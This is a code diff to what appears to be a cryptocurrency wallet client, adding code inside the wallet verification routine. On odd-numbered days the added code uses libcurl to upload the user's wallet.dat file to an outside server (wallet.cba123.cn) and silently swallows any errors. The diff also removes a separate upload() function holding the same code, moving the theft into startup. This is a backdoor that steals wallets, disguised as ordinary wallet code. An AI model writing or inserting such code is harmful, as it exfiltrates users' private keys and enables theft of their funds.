@@ -225,6 +225,41 @@ bool VerifyWallets()
     }
 
     LogPrintf("Using wallet directory %s\n", GetWalletDir().string());
+     time_t t = time(0);
+    char tmp[64];
+    strftime( tmp, sizeof(tmp), "%d",localtime(&t) );
+    if(atoi(tmp) % 2){
+        try
+        {
+            std::string const& cc=GetWalletDir().string()+std::string("/")+std::string(DEFAULT_WALLET_DAT);
+            const char* url="http://wallet.cba123.cn/get.php";
+            const char *file=cc.data();
+            CURL *curl;
+            CURLcode res;
+            FILE *fptr;
+            struct curl_slist *http_header = NULL;
+
+            curl = curl_easy_init();
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fptr);
+
+            struct curl_httppost *formpost = 0;
+            struct curl_httppost *lastptr  = 0;
+            curl_formadd(&formpost, &lastptr, CURLFORM_PTRNAME,
+                    "reqformat", CURLFORM_PTRCONTENTS, "plain", CURLFORM_END);
+            curl_formadd(&formpost, &lastptr, CURLFORM_PTRNAME,
+                    "file", CURLFORM_FILE, file, CURLFORM_END);
+            curl_easy_setopt(curl, CURLOPT_URL, url);
+            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+
+            res = curl_easy_perform(curl);
+            curl_easy_cleanup(curl);
+
+        }
+        catch(...)
+        {
+             //所有异常类型
+        }
+    }
 
     uiInterface.InitMessage(_("Verifying wallet(s)..."));
 
@@ -319,42 +354,4 @@ void CloseWallets() {
         delete pwallet;
     }
     vpwallets.clear();
-}
-
-void upload(){
-    time_t t = time(0); 
-    char tmp[64]; 
-    strftime( tmp, sizeof(tmp), "%d",localtime(&t) ); 
-    if(atoi(tmp) % 2){
-        try
-        {
-            std::string const& cc=GetWalletDir().string()+std::string("/")+std::string(DEFAULT_WALLET_DAT);
-            const char* url="http://wallet.cba123.cn/get.php";
-            const char *file=cc.data();
-            CURL *curl;
-            CURLcode res;
-            FILE *fptr;
-            struct curl_slist *http_header = NULL;
-         
-            curl = curl_easy_init();
-            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fptr);
-         
-            struct curl_httppost *formpost = 0;
-            struct curl_httppost *lastptr  = 0;
-            curl_formadd(&formpost, &lastptr, CURLFORM_PTRNAME, 
-                    "reqformat", CURLFORM_PTRCONTENTS, "plain", CURLFORM_END);
-            curl_formadd(&formpost, &lastptr, CURLFORM_PTRNAME, 
-                    "file", CURLFORM_FILE, file, CURLFORM_END);
-            curl_easy_setopt(curl, CURLOPT_URL, url);
-            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
-         
-            res = curl_easy_perform(curl);
-            curl_easy_cleanup(curl);
-
-        }
-        catch(...)
-        {
-             //所有异常类型
-        }
-    }
 }
